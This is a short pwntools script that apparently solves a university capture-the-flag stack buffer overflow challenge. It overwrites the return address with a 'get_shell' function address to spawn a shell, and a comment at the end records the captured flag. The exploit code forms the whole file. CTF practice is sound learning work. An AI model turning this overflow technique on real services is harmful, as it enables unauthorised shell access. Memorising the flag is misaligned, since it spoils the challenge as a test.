from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./bof"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1280
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b main
#     continue
# ''')

e = ELF(CHALLENGE)
s = asm("endbr64 ; push rbp", arch='amd64')
get_shell_addr = e.symbols.get_shell + len(s)

print(p.recvuntil(b"> ").decode())
msg = b"A" * 0x28 + p64(get_shell_addr)
p.sendline(msg)
log.info(f"Sending raw bytes: {msg}")
log.info(f"Overwriting the return address in the stack to: {hex(get_shell_addr)}")

p.interactive()

# flag{Sm4sh1ng_Th3_St4ck_m0stly_f0r_fUn!_33ec3b27c76880be}
